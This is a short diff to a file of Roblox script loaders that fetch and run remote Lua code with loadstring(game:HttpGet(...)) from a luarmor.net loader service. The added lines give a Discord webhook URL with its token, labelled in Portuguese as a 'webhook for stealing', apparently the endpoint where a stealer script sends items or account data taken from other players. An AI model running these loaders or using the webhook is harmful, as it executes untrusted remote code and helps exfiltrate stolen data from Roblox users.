@@ -6,3 +6,6 @@ loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/3df81335415647
 
 FIND BRAINROT:
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e9dc250fbc8890db5a9c563ac01d9a1f.lua"))()
+
+WEBHOOK PARA ROUBAR:
+https://discord.com/api/webhooks/1409002939254833273/KDbbKaXCfYlfbr-VzgpIL0QFv323PrW1wm3JbLUqn7FBkcew8VRwQSeC_P_4eCp0XO47
